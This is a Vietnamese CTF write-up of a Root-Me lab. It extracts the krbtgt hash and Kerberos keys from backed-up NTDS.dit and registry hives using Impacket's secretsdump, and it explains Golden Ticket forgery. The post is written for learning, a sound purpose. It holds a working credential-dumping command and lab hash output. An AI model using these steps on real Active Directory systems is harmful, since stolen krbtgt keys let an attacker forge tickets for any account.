---
title: "Windows - NTDS Secret Extraction"
date: 2025-07-04 12:00:00 +0700
categories: [CTF, Forensics]
tags: [active-directory, ntds, secretsdump, windows, forensics]
image:
  path: /assets/img/posts/Windows-NTDS/banner.png
  alt: Windows NTDS Secret Extraction
---

## Giới thiệu

Bài lab này từ Root-Me về trích xuất hash từ file NTDS.dit của Active Directory.

**Độ khó**: Medium  
**Category**: Endpoint  
**Tool**: secretsdump (Impacket)

## Phân tích

Đề bài cho ta các file backup từ Domain Controller:

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/Windows-NTDS/ch34/regbackup]
└─$ tree
.
├── Active Directory
│   ├── ntds.dit
│   └── ntds.jfm
└── registry
    ├── SAM
    ├── SECURITY
    └── SYSTEM
```

## Giải quyết

### 1. Cài đặt Impacket

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

### 2. Trích xuất hash

Sử dụng `secretsdump.py` để dump hash từ NTDS:

```bash
python3 ~/tools/impacket/examples/secretsdump.py \
  -ntds ntds.dit \
  -sam ../registry/SAM \
  -system ../registry/SYSTEM \
  -security ../registry/SECURITY \
  local | grep krbtgt
```

Kết quả:

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a3cf03faaf1b5a34e4d538e2206f8f0:::
krbtgt:aes256-cts-hmac-sha1-96:85c422e6d4f4e340b445c6a3f16d8d7b25bfdf290d956134bc0d5b6ab272b475
krbtgt:aes128-cts-hmac-sha1-96:fd526233205e13c0b8225087e848a101
krbtgt:des-cbc-md5:4f1f767686e52019
```

**Flag**: `85c422e6d4f4e340b445c6a3f16d8d7b25bfdf290d956134bc0d5b6ab272b475`
Như vậy ta đã trích được key nhạy cảm. Từ key nay ta có thể giả mạo TGT -> rất nguy hiểm
## Kiến thức sau mình học được

### Active Directory (AD)

Hệ thống quản lý người dùng và máy tính tập trung của Microsoft.

### NTDS.dit

- File cơ sở dữ liệu chính của AD
- Chứa: username, hash mật khẩu, nhóm, chính sách
- Tên đầy đủ: **NT Directory Services database**

### Domain

Vùng quản lý trong mạng nội bộ, nơi AD kiểm soát user/máy.

### krbtgt

- Tài khoản service mặc định của Kerberos
- Có vai trò **ký và mã hóa TGT**
- Nếu có key này → có thể giả mạo bất kỳ tài khoản nào (Golden Ticket Attack)

### TGT (Ticket Granting Ticket)

- Vé đăng nhập nhận được sau khi xác thực
- Được mã hóa và ký bởi khóa của `krbtgt`
- Dùng để xác thực nhiều lần mà không cần hỏi lại mật khẩu

### Kerberos

Giao thức xác thực cho phép các máy trong mạng xác minh danh tính của nhau một cách an toàn.

## Chi tiết các file

### `ntds.dit`

- Cơ sở dữ liệu chính của Active Directory
- Chứa toàn bộ object: user, group, GPO, OU, trust relationships
- Hash được mã hóa → cần kết hợp với `SYSTEM`

### `ntds.jfm`

- File log cho `ntds.dit` (transaction log)
- Dùng để khôi phục tính toàn vẹn khi AD bị lỗi
- Không bắt buộc để trích xuất hash

### `SYSTEM`

- File hive của Windows Registry
- Chứa **BootKey** để giải mã hash trong `ntds.dit`
- Bắt buộc cần kết hợp với `ntds.dit`

### `SAM`

- Chứa tài khoản local và hash của user local
- Không chứa account trong domain như `krbtgt`

### `SECURITY`

- Chứa các chính sách bảo mật local
- LSA secrets, cached credentials

## Tham khảo

- [Impacket GitHub](https://github.com/fortra/impacket)